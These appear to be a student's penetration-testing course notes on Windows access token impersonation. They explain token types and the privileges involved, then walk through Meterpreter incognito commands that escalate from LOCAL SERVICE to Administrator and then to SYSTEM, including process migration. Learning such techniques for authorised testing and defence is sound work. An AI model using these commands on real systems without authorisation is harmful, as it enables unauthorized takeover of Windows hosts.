**Access Token Impersonation**

**What are Access Tokens?**

- Created by **winlogon.exe** on every login, managed by **LSASS**
- Think of it like a session cookie — carries user identity + privileges
- All child processes inherit the parent's access token

**Two Token Types**

![[Pasted image 20260504234418.png]]

**Privileges needed to impersonate:**

- `SeAssignPrimaryToken` — impersonate tokens
- `SeCreateToken` — create arbitrary admin token
- `SeImpersonatePrivilege` — run process as another user ← **most common**

---

**Attack Flow**

**1. Gain access + check privs**

```bash
# Exploit HFS 2.3 same as before
getuid        # → NT AUTHORITY\LOCAL SERVICE
getprivs      # look for SeImpersonatePrivilege
```

**2. Load incognito & list tokens**

```bash
load incognito
list_tokens -u       # list user tokens
```

**3. Impersonate a privileged token**

```bash
impersonate_token "WORKSTATION\\Administrator"
getuid        # → Administrator

# If getprivs fails, migrate first
pgrep explorer
migrate <PID>
getprivs      # now elevated ✓
```

**4. Go further — impersonate SYSTEM**

```bash
list_tokens -u       # NT AUTHORITY\SYSTEM should appear now
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid        # → NT AUTHORITY\SYSTEM ✓
```

---

**Key Notes**

- Need `SeImpersonatePrivilege` on current session — service accounts often have it
- Works only if a privileged user's token is **already available** on the system
- No privileged tokens available? → Use **Potato Attack** (covered in priv esc course)
- After impersonating admin → more tokens become visible including SYSTEM
- Always migrate to a stable process (explorer.exe) after impersonation if getprivs fails
